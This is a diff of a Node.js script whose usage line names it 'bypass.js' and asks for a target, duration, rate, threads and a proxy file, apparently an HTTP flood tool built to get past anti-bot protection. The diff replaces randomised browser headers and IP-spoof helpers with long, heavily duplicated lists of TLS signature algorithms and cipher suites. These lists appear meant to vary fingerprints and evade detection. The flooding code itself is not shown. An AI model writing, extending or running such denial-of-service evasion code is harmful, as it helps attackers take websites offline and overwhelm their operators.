@@ -5,21 +5,16 @@ const net = require("net");
  const url = require("url");
  const crypto = require("crypto");
  const fs = require("fs");
- const colors = require('colors');
- const os = require("os");
-
-const errorHandler = error => {
-    //console.log(error);
-};
-process.on("uncaughtException", errorHandler);
-process.on("unhandledRejection", errorHandler);
+ const axios = require('axios');
+ const cheerio = require('cheerio'); 
+ const gradient = require("gradient-string")
 
  process.setMaxListeners(0);
  require("events").EventEmitter.defaultMaxListeners = 0;
  process.on('uncaughtException', function (exception) {
   });
 
- if (process.argv.length < 7){console.log(`Usage: target time rate thread proxyfile`); process.exit();}
+ if (process.argv.length < 7){console.log(gradient.vice(`方法：\nnode bypass.js <目标> <时间> <速率> <线程> <代理文件>`));; process.exit();}
  const headers = {};
   function readLines(filePath) {
      return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
@@ -35,7 +30,7 @@ process.on("unhandledRejection", errorHandler);
  
  function randstr(length) {
    const characters =
-     "abcdefghijklmnopqrstuvwxyz";
+     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
@@ -52,510 +47,320 @@ process.on("unhandledRejection", errorHandler);
  };
  
  const spoofed = ip_spoof();
-
-
- const ip_spoof2 = () => {
-   const getRandomByte = () => {
-     return Math.floor(Math.random() * 2500);
-   };
-   return `${getRandomByte()}`;
- };
  
- const spoofed2 = ip_spoof2();
- function getRandomDate(start = new Date(2000, 0, 1), end = new Date()) {
-    return new Date(start.getTime() + Math.random() * (end.getTime() - start.getTime()));
-}
-
- const ip_spoof3 = () => {
-   const getRandomByte = () => {
-     return Math.floor(Math.random() * 99);
-   };
-   return `${getRandomByte()}`;
- };
- 
- const spoofed3 = ip_spoof3();
- 
- const ip_spoof4 = () => {
-   const getRandomByte = () => {
-     return Math.floor(Math.random() * 9);
-   };
-   return `${getRandomByte()}`;
- };
- 
- const spoofed4 = ip_spoof4(); 
  const args = {
      target: process.argv[2],
      time: parseInt(process.argv[3]),
      Rate: parseInt(process.argv[4]),
      threads: parseInt(process.argv[5]),
-     proxyFile: process.argv[6],
+     proxyFile: process.argv[6]
  }
-
-function generateRandomPriority() {
-  const randomPriority = Math.floor(Math.random() * 256);
-  return randomPriority;
-}
-
-const randomPriorityValue = generateRandomPriority();
-
-function generateRandomString(minLength, maxLength) {
-					const characters = 'abcdefghijklmnopqrstuvwxyz'; 
-  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
-  const randomStringArray = Array.from({ length }, () => {
-    const randomIndex = Math.floor(Math.random() * characters.length);
-    return characters[randomIndex];
-  });
-
-  return randomStringArray.join('');
-}
-
  const sig = [    
-    'rsa_pss_rsae_sha256',
-    'rsa_pss_rsae_sha384',
-    'rsa_pss_rsae_sha512',
-    'rsa_pkcs1_sha256',
-    'rsa_pkcs1_sha384',
-    'rsa_pkcs1_sha512'
+    "ecdsa_secp256r1_sha256",
+    "ecdsa_secp384r1_sha384",
+    "ecdsa_secp521r1_sha512",
+    'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
+    'ecdsa_brainpoolP256r1tls13_sha256',
+    'ecdsa_brainpoolP384r1tls13_sha384',
+    'ecdsa_brainpoolP512r1tls13_sha512',
+    'ecdsa_sha1',
+    'ed25519',
+    'ed448',
+    'ecdsa_sha224',
+    'rsa_pkcs1_sha1',
+    'rsa_pss_pss_sha256',
+    'dsa_sha256',
+    'dsa_sha384',
+    'dsa_sha512',
+    'dsa_sha224',
+    'dsa_sha1',
+    'rsa_pss_pss_sha384',
+    'rsa_pkcs1_sha2240',
+    'rsa_pss_pss_sha512',
+    'sm2sig_sm3',
+    'ecdsa_secp521r1_sha512',
+    "rsa_pss_rsae_sha256",
+    "rsa_pss_rsae_sha384",
+    "rsa_pss_rsae_sha512",
+    "rsa_pkcs1_sha256",
+    "rsa_pkcs1_sha384",
+    "rsa_pkcs1_sha512",
  ];
  const sigalgs1 = sig.join(':');
  const cplist = [
-  "TLS_AES_128_CCM_8_SHA256",
-  "TLS_AES_128_CCM_SHA256",
-  "TLS_CHACHA20_POLY1305_SHA256",
-  "TLS_AES_256_GCM_SHA384",
-  "TLS_AES_128_GCM_SHA256"
- ];
-const val = { 'NEl': JSON.stringify({
-			"report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
-			"max-age": Math.random() < 0.5 ? 604800 : 2561000,
-			"include_subdomains": Math.random() < 0.5 ? true : false}),
-            }
- const accept_header = [
-  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
-  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
-  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
-  'text/html; charset=utf-8',
-  'application/json, text/plain, */*',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
-  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
- ]; 
- lang_header = [
-  'ko-KR',
-  'en-US',
-  'zh-CN',
-  'zh-TW',
-  'ja-JP',
-  'en-GB',
-  'en-AU',
-  'en-GB,en-US;q=0.9,en;q=0.8',
-  'en-GB,en;q=0.5',
-  'en-CA',
-  'en-UK, en, de;q=0.5',
-  'en-NZ',
-  'en-GB,en;q=0.6',
-  'en-ZA',
-  'en-IN',
-  'en-PH',
-  'en-SG',
-  'en-HK',
-  'en-GB,en;q=0.8',
-  'en-GB,en;q=0.9',
-  ' en-GB,en;q=0.7',
-  '*',
-  'en-US,en;q=0.5',
-  'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
-  'utf-8, iso-8859-1;q=0.5, *;q=0.1',
-  'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
-  'en-GB, en-US, en;q=0.9',
-  'de-AT, de-DE;q=0.9, en;q=0.5',
-  'cs;q=0.5',
-  'da, en-gb;q=0.8, en;q=0.7',
-  'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
-  'en-US,en;q=0.9',
-  'de-CH;q=0.7',
-  'tr',
-  'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
- ];
- 
- const encoding_header = [
-  '*',
-  '*/*',
-  'gzip',
-  'gzip, deflate, br',
-  'compress, gzip',
-  'deflate, gzip',
-  'gzip, identity',
-  'gzip, deflate',
-  'br',
-  'br;q=1.0, gzip;q=0.8, *;q=0.1',
-  'gzip;q=1.0, identity; q=0.5, *;q=0',
-  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
-  'compress;q=0.5, gzip;q=1.0',
-  'identity',
-  'gzip, compress',
-  'compress, deflate',
-  'compress',
-  'gzip, deflate, br',
-  'deflate',
-  'gzip, deflate, lzma, sdch',
-  'deflate',
- ];
- 
- const control_header = [
-  'max-age=604800',
-  'proxy-revalidate',
-  'public, max-age=0',
-  'max-age=315360000',
-  'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
-  's-maxage=604800',
-  'max-stale',
-  'public, immutable, max-age=31536000',
-  'must-revalidate',
-  'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
-  'max-age=31536000,public,immutable',
-  'max-age=31536000,public',
-  'min-fresh',
-  'private',
-  'public',
-  's-maxage',
-  'no-cache',
-  'no-cache, no-transform',
-  'max-age=2592000',
-  'no-store',
-  'no-transform',
-  'max-age=31557600',
-  'stale-if-error',
-  'only-if-cached',
-  'max-age=0',
- ];
- 
- const nm = [
-"110.0.0.0",
-"111.0.0.0",
-"112.0.0.0",
-"113.0.0.0",
-"114.0.0.0",
-"115.0.0.0",
-"116.0.0.0",
-"117.0.0.0",
-"118.0.0.0",
-"119.0.0.0",
-];
-const nmx = [
-"120.0",
-"119.0",
-"118.0",
-"117.0",
-"116.0",
-"115.0",
-"114.0",
-"113.0",
-"112.0",
-"111.0",
-];
-const nmx1 = [
-"105.0.0.0",
-"104.0.0.0",
-"103.0.0.0",
-"102.0.0.0",
-"101.0.0.0",
-"100.0.0.0",
-"99.0.0.0",
-"98.0.0.0",
-"97.0.0.0",
-];
-const sysos = [
-"Windows 1.01",
-"Windows 1.02",
-"Windows 1.03",
-"Windows 1.04",
-"Windows 2.01",
-"Windows 3.0",
-"Windows NT 3.1",
-"Windows NT 3.5",
-"Windows 95",
-"Windows 98",
-"Windows 2006",
-"Windows NT 4.0",
-"Windows 95 Edition",
-"Windows 98 Edition",
-"Windows Me",
-"Windows Business",
-"Windows XP",
-"Windows 7",
-"Windows 8",
-"Windows 10 version 1507",
-"Windows 10 version 1511",
-"Windows 10 version 1607",
-"Windows 10 version 1703",
-];
-const winarch = [
-"x86-16",
-"x86-16, IA32",
-"IA-32",
-"IA-32, Alpha, MIPS",
-"IA-32, Alpha, MIPS, PowerPC",
-"Itanium",
-"x86_64",
-"IA-32, x86-64",
-"IA-32, x86-64, ARM64",
-"x86-64, ARM64",
-"ARMv4, MIPS, SH-3",
-"ARMv4",
-"ARMv5",
-"ARMv7",
-"IA-32, x86-64, Itanium",
-"IA-32, x86-64, Itanium",
-"x86-64, Itanium",
-];
-const winch = [
-"2012 R2",
-"2019 R2",
-"2012 R2 Datacenter",
-"Server Blue",
-"Longhorn Server",
-"Whistler Server",
-"Shell Release",
-"Daytona",
-"Razzle",
-"HPC 2008",
-];
+    "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
+    "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES",
+    "ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES",
+    "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES",
+    "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
+    "ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES",
+    "ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES",
+    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
+    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
+         "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+     "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
+     "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
+     "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
+  "TLS_CHACHA20_POLY1305_SHA256:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
+  "TLS-AES-256-GCM-SHA384:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
+  "TLS-AES-128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
+  "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
+  "TLS_CHACHA20_POLY1305_SHA256:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
+  "TLS-AES-256-GCM-SHA384:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
+  "TLS-AES-128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384",
+  "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384","ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-SHA256", "ECDHE-RSA-AES128-SHA256", "ECDHE-ECDSA-AES256-SHA384", "ECDHE-RSA-AES256-SHA384","ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-SHA256", "ECDHE-RSA-AES128-SHA256", "ECDHE-ECDSA-AES256-SHA384", "ECDHE-RSA-AES256-SHA384", "ECDHE-ECDSA-AES128-SHA", "ECDHE-RSA-AES128-SHA", "AES128-GCM-SHA256", "AES128-SHA256", "AES128-SHA", "ECDHE-RSA-AES256-SHA", "AES256-GCM-SHA384", "AES256-SHA256", "AES256-SHA",
+  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+  'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
+  'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
+  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
+  "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
+  "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
+  "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
+  "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
 
- var nm1 = nm[Math.floor(Math.floor(Math.random() * nm.length))];
- var nm2 = sysos[Math.floor(Math.floor(Math.random() * sysos.length))];
- var nm3 = winarch[Math.floor(Math.floor(Math.random() * winarch.length))];
- var nm4 = nmx[Math.floor(Math.floor(Math.random() * nmx.length))];
- var nm5 = winch[Math.floor(Math.floor(Math.random() * winch.length))];
- var nm6 = nmx1[Math.floor(Math.floor(Math.random() * nmx1.length))];
+  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
+  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
+  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
+  'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
+  'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
+  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
+
+  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+  'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
+  'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
+  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
+  "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
+  "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
+  "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
+  "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
+
+  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
+  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
+  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
+  'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
+  'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
+  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
+
+
+  'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
+  ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
+  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
+  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
+     "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
+     "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
+ ];
